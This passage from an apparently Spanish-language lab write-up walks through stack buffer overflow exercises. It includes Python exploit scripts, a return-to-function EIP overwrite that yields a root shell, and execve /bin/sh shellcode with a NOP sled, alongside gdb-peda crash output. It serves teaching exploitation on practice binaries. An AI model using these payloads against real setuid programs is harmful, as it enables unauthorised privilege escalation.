    <p>Como sabemos que equivale ala letra <code class="language-plaintext highlighter-rouge">B</code> vemos que esta igualado a <code class="language-plaintext highlighter-rouge">4</code> <code class="language-plaintext highlighter-rouge">B</code> para poder obtener la <code class="language-plaintext highlighter-rouge">Bash</code> que necesitamos necesitamos enviar el tamaño del Buff que son <code class="language-plaintext highlighter-rouge">32 bytes</code> + las B para que la condición se true y se ejecute.</p>
  </li>
  <li>
    <p>Vamos a crear un script rápido en <code class="language-plaintext highlighter-rouge">python</code> que haga todo lo que necesitamos.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python2</span>

first <span class="o">=</span> b<span class="s2">"A"</span> <span class="k">*</span> 32 <span class="c"># le pasamos 32 veces A para el buffer</span>

key <span class="o">=</span> b<span class="s2">"B"</span> <span class="k">*</span> 4 <span class="c"># le pasamos las 4 B </span>

print<span class="o">(</span>first + key<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Al cumplirse todas las condiciones nos debería de otorgar una <code class="language-plaintext highlighter-rouge">bash</code> como el usuario que esta corriendo el binario en este caso será mi usuario ya que yo lo estoy ejecutando.</p>
  </li>
  <li>
    <p>Allí podemos ver los <code class="language-plaintext highlighter-rouge">prints</code> que se cumplen y por eso nos otorga la <code class="language-plaintext highlighter-rouge">bash</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels ./levelOne <span class="si">$(</span>python2 scriptOne.py<span class="si">)</span>
Buf is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Key is: 0x42424242
<span class="nv">$ </span><span class="nb">whoami
</span>miguel
</code></pre></div></div>

<h2 id="leveltwo">LevelTwo</h2>

<blockquote>
  <p>Llamada a la dirección de una función que te otorga una /bin/sh.</p>
</blockquote>

<ul>
  <li>
    <p>Continuamos con el nivel 2 vamos a ver el código.</p>
  </li>
  <li>
    <p>En este caso vemos que en el código se esta definiendo el <code class="language-plaintext highlighter-rouge">uid</code> al propietario del binario ósea <code class="language-plaintext highlighter-rouge">level2</code> ya que este es el segundo binario el <code class="language-plaintext highlighter-rouge">uid</code> funciona para almacenar identificadores de usuario, es el identificador de usuario en Linux y antes del return podemos ver que esta llamando a una función llamada <code class="language-plaintext highlighter-rouge">hello</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/2.png" />
</p>

<ul>
  <li>En esta imagen vemos el código de la función <code class="language-plaintext highlighter-rouge">hello</code> que se esta usando en el código.</li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/3.png" />
</p>

<ul>
  <li>
    <p>Vemos que se define un tamaño de 28 bytes y usa <code class="language-plaintext highlighter-rouge">strcpy</code> que copea el argumento que le pasas.</p>
  </li>
  <li>
    <p>Si inspeccionamos la funciona <code class="language-plaintext highlighter-rouge">spawn</code> tenemos que pasarle 3 argumentos para que nos de una <code class="language-plaintext highlighter-rouge">Bash</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/4.png" />
</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">spawn</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="c1">//privilegios de super usuario</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>  <span class="c1">// Argumentos para /bin/sh</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">env</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>  <span class="c1">// No se pasan variables de entorno</span>
  <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">env</span><span class="p">);</span> <span class="c1">// se interpreta la bash</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Para empezar vamos a usar <code class="language-plaintext highlighter-rouge">gdb</code> que es un <code class="language-plaintext highlighter-rouge">debugger</code> y lo usaremos junto con peda <a href="https://github.com/longld/peda">https://github.com/longld/peda</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels gdb <span class="nt">-q</span> levelTwo
Reading symbols from levelTwo...
<span class="o">(</span>No debugging symbols found <span class="k">in </span>levelTwo<span class="o">)</span>
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>En el código vimos que se esta definiendo que son 28 bytes de buffer a si que vamos a enviar 100 bytes para ver si se corrompe el binario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_arg 100
Set 1 arguments to program
</code></pre></div></div>

<ul>
  <li>Ahora lo corremos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>run
Starting program: /home/miguel/StackOverflow/levels/levelTwo <span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'</span>
<span class="o">[</span>Thread debugging using libthread_db enabled]
Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
Hello AAA%AAsAABAA<span class="nv">$AAnAACAA</span><span class="nt">-AA</span><span class="o">(</span>AADAA<span class="p">;</span>AA<span class="o">)</span>AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.
Warning: <span class="s1">'set logging off'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled off'</span><span class="nb">.</span>

Warning: <span class="s1">'set logging on'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled on'</span><span class="nb">.</span>
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
EAX: 0x6b <span class="o">(</span><span class="s1">'k'</span><span class="o">)</span>
EBX: 0x413b4141 <span class="o">(</span><span class="s1">'AA;A'</span><span class="o">)</span>
ECX: 0xffffcf0c <span class="nt">--</span><span class="o">&gt;</span> 0x2e6b3000 <span class="o">(</span><span class="s1">''</span><span class="o">)</span>
EDX: 0x1
ESI: 0xffffcfe0 <span class="nt">--</span><span class="o">&gt;</span> 0x2
EDI: 0xf7ffcba0 <span class="nt">--</span><span class="o">&gt;</span> 0x0
EBP: 0x41412941 <span class="o">(</span><span class="s1">'A)AA'</span><span class="o">)</span>
ESP: 0xffffcf90 <span class="o">(</span><span class="s2">"AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
EIP: 0x61414145 <span class="o">(</span><span class="s1">'EAAa'</span><span class="o">)</span>
EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
Invalid <span class="nv">$PC</span> address: 0x61414145
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0xffffcf90 <span class="o">(</span><span class="s2">"AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
0004| 0xffffcf94 <span class="o">(</span><span class="s2">"AFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
0008| 0xffffcf98 <span class="o">(</span><span class="s2">"bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
0012| 0xffffcf9c <span class="o">(</span><span class="s2">"AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
0016| 0xffffcfa0 <span class="o">(</span><span class="s2">"AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
0020| 0xffffcfa4 <span class="o">(</span><span class="s2">"2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
0024| 0xffffcfa8 <span class="o">(</span><span class="s2">"AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
0028| 0xffffcfac <span class="o">(</span><span class="s2">"A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x61414145 <span class="k">in</span> ?? <span class="o">()</span>
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Ahora lo que tenemos que hacer es buscar el <code class="language-plaintext highlighter-rouge">offset</code> que es un valor para determinar la posicion en la memoria que se va a sobrescribir para esto le vamos a pasar el <code class="language-plaintext highlighter-rouge">EIP</code> que es la dirección de memoria de la próxima instrucción a ejecutar, el objetivo es manipular el valor del registro <code class="language-plaintext highlighter-rouge">EIP</code> para que apunte a una dirección de memoria controlada por nosotros.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_offset 0x61414145
1631666501 found at offset: 36
</code></pre></div></div>

<ul>
  <li>Ahora vimos que en el código hay una función <code class="language-plaintext highlighter-rouge">spawn</code> y necesitamos saber su dirección a si que vamos a buscarla.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>info <span class="k">function</span> ^spawn<span class="err">$</span>
All functions matching regular expression <span class="s2">"^spawn$"</span>:

Non-debugging symbols:
0x565561e9  spawn
</code></pre></div></div>

<ul>
  <li>Y bueno ya tenemos la dirección pero como estamos en <code class="language-plaintext highlighter-rouge">little endian</code> tenemos que darle la vuelta ala dirección.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x565561e9      |    <span class="se">\x</span>56<span class="se">\x</span>55<span class="se">\x</span>61<span class="se">\x</span>e9    | <span class="se">\x</span>e9<span class="se">\x</span>61<span class="se">\x</span>55<span class="se">\x</span>56
</code></pre></div></div>

<ul>
  <li>Ahora como ya tenemos todo listo podemos seguir con el script para que todo esto funcione.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">cat </span>scriptTwo.py
<span class="c">#!/usr/bin/python2</span>

offset <span class="o">=</span> 36 <span class="c"># pattern_offset 0x61414145</span>

null <span class="o">=</span> b<span class="s2">"A"</span> <span class="k">*</span> offset <span class="c"># vamos a pasarle eso para asta llegar al EIP</span>

spawn <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">e9</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">55</span><span class="se">\x</span><span class="s2">56"</span> <span class="c"># Le pasamos la direccion para que el EIP apunte a ala funcion spawn</span>

print<span class="o">(</span>null + spawn<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Y funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels ./levelTwo <span class="si">$(</span>python2 scriptTwo.py<span class="si">)</span>
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�UV
<span class="c"># whoami</span>
root
<span class="c">#</span>
</code></pre></div></div>

<h2 id="level-3">Level 3</h2>

<blockquote>
  <p>Stack Based.</p>
</blockquote>

<ul>
  <li>
    <p>Vamos a observar el código.</p>
  </li>
  <li>
    <p>Después de analizar con <code class="language-plaintext highlighter-rouge">ghidra</code> esta es la funciona <code class="language-plaintext highlighter-rouge">main</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/main.png" />
</p>

<ul>
  <li>Esta haciendo casi lo mismo pero ahora llama a la funciona <code class="language-plaintext highlighter-rouge">overflow</code>.</li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/main2.png" />
</p>

<ul>
  <li>Ahora define un buffer de <code class="language-plaintext highlighter-rouge">260 bytes</code> y copea el argumento con la función <code class="language-plaintext highlighter-rouge">strcpy</code> que habíamos visto de antes en los binarios anterior, si <code class="language-plaintext highlighter-rouge">param_1</code> contiene más de <code class="language-plaintext highlighter-rouge">260</code> caracteres, los datos adicionales se escribirán en la memoria adyacente a <code class="language-plaintext highlighter-rouge">local_10c</code>, lo que puede provocar un desbordamiento de búfer.</li>
</ul>

<pre><code class="language-C">void overflow(char *param_1)

{
  char local_10c [260];
  
  strcpy(local_10c,param_1);
  printf("Buf: %s\n",local_10c);
  return;
}
</code></pre>

<ul>
  <li>Vamos a volver a usar <code class="language-plaintext highlighter-rouge">gdb</code> para corromper el binario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels gdb <span class="nt">-q</span> levelThree
Reading symbols from levelThree...
<span class="o">(</span>No debugging symbols found <span class="k">in </span>levelThree<span class="o">)</span>
gdb-peda<span class="nv">$ </span>pattern_arg 300
Set 1 arguments to program
gdb-peda<span class="nv">$ </span>run
Starting program: /home/miguel/StackOverflow/levels/levelThree <span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'</span>
<span class="o">[</span>Thread debugging using libthread_db enabled]
Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
Buf: AAA%AAsAABAA<span class="nv">$AAnAACAA</span><span class="nt">-AA</span><span class="o">(</span>AADAA<span class="p">;</span>AA<span class="o">)</span>AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="nv">$A</span>%nA%CA%-A%<span class="o">(</span>A%DA%<span class="p">;</span>A%<span class="o">)</span>A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%

Program received signal SIGSEGV, Segmentation fault.
Warning: <span class="s1">'set logging off'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled off'</span><span class="nb">.</span>

Warning: <span class="s1">'set logging on'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled on'</span><span class="nb">.</span>
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
EAX: 0x132
EBX: 0x25413225 <span class="o">(</span><span class="s1">'%2A%'</span><span class="o">)</span>
ECX: 0xffffd0bc <span class="nt">--</span><span class="o">&gt;</span> 0x13ecbc00
EDX: 0x1
ESI: 0xffffd270 <span class="nt">--</span><span class="o">&gt;</span> 0x2
EDI: 0xf7ffcba0 <span class="nt">--</span><span class="o">&gt;</span> 0x0
EBP: 0x64254148 <span class="o">(</span><span class="s1">'HA%d'</span><span class="o">)</span>
ESP: 0xffffd220 <span class="o">(</span><span class="s2">"%IA%eA%4A%JA%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
EIP: 0x41332541 <span class="o">(</span><span class="s1">'A%3A'</span><span class="o">)</span>
EFLAGS: 0x10282 <span class="o">(</span>carry parity adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
Invalid <span class="nv">$PC</span> address: 0x41332541
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0xffffd220 <span class="o">(</span><span class="s2">"%IA%eA%4A%JA%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
0004| 0xffffd224 <span class="o">(</span><span class="s2">"eA%4A%JA%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
0008| 0xffffd228 <span class="o">(</span><span class="s2">"A%JA%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
0012| 0xffffd22c <span class="o">(</span><span class="s2">"%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
0016| 0xffffd230 <span class="o">(</span><span class="s2">"5A%KA%gA%6A%"</span><span class="o">)</span>
0020| 0xffffd234 <span class="o">(</span><span class="s2">"A%gA%6A%"</span><span class="o">)</span>
0024| 0xffffd238 <span class="o">(</span><span class="s2">"%6A%"</span><span class="o">)</span>
0028| 0xffffd23c <span class="nt">--</span><span class="o">&gt;</span> 0x0
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41332541 <span class="k">in</span> ?? <span class="o">()</span>
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Ahora buscamos el <code class="language-plaintext highlighter-rouge">offset</code> le vamos a pasar el <code class="language-plaintext highlighter-rouge">EIP</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_offset 0x41332541
1093870913 found at offset: 268
</code></pre></div></div>

<ul>
  <li>Necesitamos 268 bytes para sobrescribir el <code class="language-plaintext highlighter-rouge">EIP</code> como no hay una función que nos otorgue una <code class="language-plaintext highlighter-rouge">bash</code> vamos a definir un <code class="language-plaintext highlighter-rouge">shellcode</code> podemos usar el siguiente <a href="https://www.exploit-db.com/shellcodes/13628">https://www.exploit-db.com/shellcodes/13628</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python2</span>

offset <span class="o">=</span> 268

shellcode  <span class="o">=</span> b<span class="s2">""</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
</code></pre></div></div>

<ul>
  <li>Ahora vamos a usar <code class="language-plaintext highlighter-rouge">NOP</code> que no realiza ninguna acción solo es para rellenar el espacio que falta en la memoria para permitir que el flujo del control del programa sea manipulado pero muy importante tenemos que restarle el tamaño del <code class="language-plaintext highlighter-rouge">shellcode</code> por que no podemos pasarnos de <code class="language-plaintext highlighter-rouge">268 bytes</code> para no sobrescribir el <code class="language-plaintext highlighter-rouge">EIP</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">cat </span>scriptThree.py
<span class="c">#!/usr/bin/python2</span>
<span class="c"># -*- coding: utf-8 -*-</span>

offset <span class="o">=</span> 268 <span class="c">#En el shellcode son las intrucciones maliciosas</span>

shellcode  <span class="o">=</span> b<span class="s2">""</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>

junk <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">90"</span> <span class="k">*</span> <span class="o">(</span>offset - len<span class="o">(</span>shellcode<span class="o">))</span> <span class="c">#x90", representa la instrucción "NOP" en lenguaje de máquina</span>
eip <span class="o">=</span> b<span class="s2">"B"</span> <span class="k">*</span> 4 <span class="c">#eip contiene una secuencia de caracteres "B" repetidos 4 veces, lo que representa el valor que se escribirá en el registro EIP.</span>
print<span class="o">(</span>junk + shellcode + eip<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora para probar vamos con <code class="language-plaintext highlighter-rouge">gdb</code> pasando el <code class="language-plaintext highlighter-rouge">script</code> como argumento.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>run <span class="si">$(</span>python2 scriptThree.py<span class="si">)</span>
Starting program: /home/miguel/StackOverflow/levels/levelThree <span class="si">$(</span>python2 scriptThree.py<span class="si">)</span>
<span class="o">[</span>Thread debugging using libthread_db enabled]
Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
Buf: j
      XRh//shh/bin��BBBB

Program received signal SIGSEGV, Segmentation fault.
Warning: <span class="s1">'set logging off'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled off'</span><span class="nb">.</span>

Warning: <span class="s1">'set logging on'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled on'</span><span class="nb">.</span>
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
EAX: 0x116
EBX: 0xe3896e69
ECX: 0xffffd0dc <span class="nt">--</span><span class="o">&gt;</span> 0xe67ff500
EDX: 0x1
ESI: 0xffffd290 <span class="nt">--</span><span class="o">&gt;</span> 0x2
EDI: 0xf7ffcba0 <span class="nt">--</span><span class="o">&gt;</span> 0x0
EBP: 0x80cdc931
ESP: 0xffffd240 <span class="nt">--</span><span class="o">&gt;</span> 0xffffd400 <span class="nt">--</span><span class="o">&gt;</span> 0x3
EIP: 0x42424242 <span class="o">(</span><span class="s1">'BBBB'</span><span class="o">)</span>
EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
Invalid <span class="nv">$PC</span> address: 0x42424242
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0xffffd240 <span class="nt">--</span><span class="o">&gt;</span> 0xffffd400 <span class="nt">--</span><span class="o">&gt;</span> 0x3
0004| 0xffffd244 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0008| 0xffffd248 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0012| 0xffffd24c <span class="o">(</span><span class="s2">"7bUV"</span><span class="o">)</span>
0016| 0xffffd250 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0020| 0xffffd254 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0024| 0xffffd258 <span class="nt">--</span><span class="o">&gt;</span> 0x13
0028| 0xffffd25c <span class="nt">--</span><span class="o">&gt;</span> 0x0
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 <span class="k">in</span> ?? <span class="o">()</span>
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Como pudimos ver <code class="language-plaintext highlighter-rouge">EIP</code> contiene <code class="language-plaintext highlighter-rouge">BBBB</code> que era lo que definimos que haga en el script.</p>
  </li>
  <li>
    <p>Vamos a buscar en la pila alguna dirección que contenga los <code class="language-plaintext highlighter-rouge">nops</code> que están antes del <code class="language-plaintext highlighter-rouge">shellcode</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/pila.png" />
</p>

<ul>
  <li>El comando funciona para inspeccionar la memoria vamos a examinar 300 unidades <code class="language-plaintext highlighter-rouge">w</code> quiere decir que cada unidad que se examina es una palabra y <code class="language-plaintext highlighter-rouge">x</code> indica que el formato de salida debe ser <code class="language-plaintext highlighter-rouge">hexadecimal</code>.</li>
</ul>

<blockquote>
  <p>$esp es el registro del stack pointer en arquitecturas x86. Este registro apunta a la cima de la pila en la memoria. En el contexto de un programa que ejecuta un exploit de desbordamiento de buffer, $esp te dirá dónde está actualmente la “cima” de la pila, lo cual es crítico para entender cómo tus datos (o payload) están organizados en la memoria.</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>x/300wx <span class="nv">$esp</span>
0xffffd240:	0xffffd400	0x00000000	0x00000000	0x56556237
0xffffd250:	0x00000000	0x00000000	0x00000013	0x00000000
0xffffd260:	0xf7c216ac	0xf7fd9e61	0xf7c1c9a2	0xffffd290
0xffffd270:	0xf7e1dff4	0x56556280	0x00000000	0xf7c237c5
0xffffd280:	0x00000001	0x00000000	0x00000078	0xf7c237c5
0xffffd290:	0x00000002	0xffffd344	0xffffd350	0xffffd2b0
0xffffd2a0:	0xf7e1dff4	0x56556212	0x00000002	0xffffd344
0xffffd2b0:	0xf7e1dff4	0x56556280	0xf7ffcba0	0x00000000
0xffffd2c0:	0x8a0cc8d7	0xf1c6e2c7	0x00000000	0x00000000
0xffffd2d0:	0x00000000	0xf7ffcba0	0x00000000	0xd1348400
0xffffd2e0:	0xf7ffda30	0xf7c23756	0xf7e1dff4	0xf7c23888
0xffffd2f0:	0xf7fcaac4	0x56559000	0x00000002	0x56556090
0xffffd300:	0x00000000	0xf7fdbe80	0xf7c23809	0x56559000
0xffffd310:	0x00000002	0x56556090	0x00000000	0x565560c1
0xffffd320:	0x56556212	0x00000002	0xffffd344	0x56556280
0xffffd330:	0x565562e0	0xf7fceca0	0xffffd33c	0xf7ffda30
0xffffd340:	0x00000002	0xffffd4bc	0xffffd4e9	0x00000000
0xffffd350:	0xffffd5fa	0xffffd60e	0xffffd619	0xffffd626
0xffffd360:	0xffffd684	0xffffd693	0xffffd6b7	0xffffd6ce
0xffffd370:	0xffffdde7	0xffffddfb	0xffffde08	0xffffde12
0xffffd380:	0xffffde1d	0xffffde30	0xffffde49	0xffffde58
0xffffd390:	0xffffde63	0xffffde6e	0xffffde91	0xffffdeac
0xffffd3a0:	0xffffdeca	0xffffdee8	0xffffdef0	0xffffdf16
0xffffd3b0:	0xffffdf3f	0xffffdf54	0xffffdf5f	0xffffdf67
0xffffd3c0:	0xffffdf87	0xffffdfb6	0xffffdfbf	0x00000000
0xffffd3d0:	0x00000020	0xf7fc8570	0x00000021	0xf7fc8000
0xffffd3e0:	0x00000033	0x00000e30	0x00000010	0x0f8bfbff
0xffffd3f0:	0x00000006	0x00001000	0x00000011	0x00000064
0xffffd400:	0x00000003	0x56555034	0x00000004	0x00000020
0xffffd410:	0x00000005	0x0000000b	0x00000007	0xf7fca000
0xffffd420:	0x00000008	0x00000000	0x00000009	0x56556090
0xffffd430:	0x0000000b	0x00000000	0x0000000c	0x00000000
0xffffd440:	0x0000000d	0x00000000	0x0000000e	0x00000000
0xffffd450:	0x00000017	0x00000000	0x00000019	0xffffd49b
0xffffd460:	0x0000001a	0x00000002	0x0000001f	0xffffdfcb
0xffffd470:	0x0000000f	0xffffd4ab	0x0000001b	0x0000001c
